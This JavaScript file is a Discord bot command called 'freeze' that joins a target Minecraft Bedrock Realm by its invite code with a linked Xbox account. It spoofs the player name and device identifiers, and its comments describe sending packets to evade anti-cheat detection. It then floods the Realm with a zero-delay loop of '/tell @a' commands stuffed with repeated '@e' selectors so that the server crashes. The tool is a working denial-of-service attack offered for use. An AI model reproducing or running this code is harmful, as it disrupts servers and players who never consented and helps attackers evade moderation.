const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
const config = require('../../data/discord/config.json');
const fs = require('node:fs');
const colors = require('../../data/handles/colors.js');
const path = require('path');
const { createClient } = require('bedrock-protocol');
const { dumprealm } = require('../../men/realms');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { Authflow, Titles } = require("prismarine-auth");
const skinData = require('../../data/client/jenny.json')

module.exports = {
    data: new SlashCommandBuilder()
        .setName("freeze")
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .setDescription("Freeze the whole Realm")
        .addIntegerOption(option =>
            option.setName('account')
                .setDescription('Account you wanna use')
                .setRequired(true)
                .addChoices(
                    { name: 'Account 1', value: 1 },
                    { name: 'Account 2', value: 2 },
                    { name: 'Account 3', value: 3 }))
        .addStringOption(option =>
            option.setName('invite')
                .setDescription('Realm invite code')
                .setRequired(true)
                .setMinLength(8)
                .setMaxLength(15))
        .addStringOption(option =>
                option.setName('namespoof_name')
                .setDescription('Realm invite code')
                .setRequired(false)
                .setMinLength(1)
                .setMaxLength(40)),
    async execute(interaction) {
        const invite = interaction.options.getString('invite');
        const namespoof = interaction.options.getString('namespoof_name') || " "
        const account = interaction.options.getInteger('account') 
        let disconnected = false;

        try {
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Ranls Freeze (r)")
                        .setDescription(`Loading data, this may take a few seconds depending on the workload.`)
                        .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                        .setThumbnail(config.embeds.footerurl)
                        .setColor(config.embeds.color)
                ],ephemeral: true,
            });

            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}/profile${account}`)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `X Account Not Linked X`,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: { text: "e" },
                        },
                    ],
                });
                return;
            }

            const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
            if (whitelist.includes(invite)) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Ranls Error')
                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }

            const realm = await dumprealm(invite);
            if (!realm) {
                console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Ranls Error')
                            .setDescription(`Invalid code: realm not found or account banned.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }
            
            const crypto = require("node:crypto");
            const curve = "secp384r1";
            const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
            const bot = new Authflow(
                interaction.user.id, 
                path.resolve(`./data/client/frosted/${interaction.user.id}/profile${account}`), 
                {
                    flow: 'live',
                    authTitle: 'MinecraftNintendoSwitch',
                    deviceType: 'Nintendo',
                    doSisuAuth: true
                }
            );
            
            async function refreshOrRetrieveTokens() {
                try {
                    const xboxToken = await bot.getXboxToken();
                    await bot.getMinecraftBedrockToken(keypair);
                    console.log('Susesfull Refreshed Token:', xboxToken);
                    return xboxToken;
                } catch (error) {
                    console.error('Error while Refrshing', error);
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                }
            }
            
            (async () => {
                console.log('Refreshing Token...');
                
                const token = await refreshOrRetrieveTokens();
                if (token) {
                    console.log('Susessfull Refreshd Token');
                    
                } else {
                    console.log('Error Refreshing Token');
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                    return;
                }
            })();

            const client = createClient({
                profilesFolder: `./data/client/frosted/${interaction.user.id}/profile${account}`,
                username: interaction.user.id,
                offline: false,
                realms: {
                    ...(invite.length === 8
                        ? { realmId: invite }
                        : { realmInvite: invite })
                },
                skinData: {
                    DeviceOS: 12,
                    DeviceId: uuidv3(uuidv4(), NIL),
                    PlatformOnlineId: genrandomstring(19, '1234567890'),
                    PrimaryUser: false,
                    SelfSignedId: uuidv4(),
                    ThirdPartyName: namespoof,
                    ThirdPartyNameOnly: true,
                    TrustedSkin: true,
                    ...skinData // costume skin for less detaction
                },
                skipPing: true
            });

            client.on('error', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client error: ${err.message || err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Ranls Error')
                            .setDescription(`Error occurred: ${err.message || 'Unknown error'}`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
                client.disconnect();
            });
             
            let runtimeEntityId;

            client.on('start_game', (packet) => { // Small littel Hack to make Bot less Detactebel
              runtimeEntityId = packet.runtime_entity_id
              console.log(`Runtime Entity ID: ${runtimeEntityId}`);
            });
            client.on('start_game', (packet) => {
            client.queue('serverbound_loading_screen', { // sends the "is loading in Packet"
              "type": 1
            })
            client.queue('serverbound_loading_screen', { // Removes the immortal status of the Bot
              "type": 2
            })
            client.queue('interact', {  // Verify the Movement so Server sees us as a Real Player !
              "action_id": "mouse_over_entity",
              "target_entity_id": 0n,
              "position": {
                "x": 0,
                "y": 0,
                "z": 0
              }
            })
            client.queue('set_local_player_as_initialized', { // almost same as the first but mc is goofy and needs more packets, do i know ? nope !
              "runtime_entity_id": `${runtimeEntityId}`
            })
            client.queue("animate", {//  like a spoof to anti cheats :p
                action_id: 1, // making your arm swing 
                runtime_entity_id: packet.runtime_entity_id});
            })
            client.on('play_status', async () => {
                console.log(`${colors.green}[Realm Watcher]${colors.cyan}>> User ${interaction.user.username}/${interaction.user.id} join Realm ${realm.name}/${invite}`)
                try {
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('Ranls Crash (r)')
                                .setDescription(`Joined and started to crash ${realm.name} - ${invite}. Disconnecting in 10 seconds...`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });

                    setInterval(() => {
                        client.write('command_request', {
                            command: `/tell @a §l§c§k${"@e".repeat(70)} |§3§l§ Ranls §4§ on TOP `,
                            origin: {
                                type: 0,
                                uuid: '5',
                                request_id: 'TSL Nuker',
                            },
                            internal: false,
                            version: 66,
                        });
                        client.write('command_request', {
                            command: `/tell @a §l§c§k${"@e".repeat(70)} |§3§l§ Ranls §4§ on TOP `,
                            origin: {
                                type: 0,
                                uuid: '5',
                                request_id: 'TSL Nuker',
                            },
                            internal: false,
                            version: 66,
                        });
                    }, 0); 

                    setTimeout(() => {
                        if (!disconnected) {
                            client.close();
                            interaction.editReply({
                                embeds: [
                                    new EmbedBuilder()
                                        .setTitle('Ranls Crash (r)')
                                        .setDescription(`Client disconnected from ${realm.name}. Crash successful.`)
                                        .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                                        .setThumbnail(config.embeds.footerurl)
                                        .setColor(config.embeds.color)
                                ]
                            });
                            disconnected = true;
                        }
                    }, 10 * 1000);
                } catch (error) {
                    console.error(error);
                    throw error;
                }
            });

            client.on('close', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client closed: ${err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Ranls Error')
                            .setDescription(`Connection closed. Crash completed.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/5Kj3uCzBKY`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            });
        } catch (err) {
            console.error(err);
        }
    }
};

function genrandomstring(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}

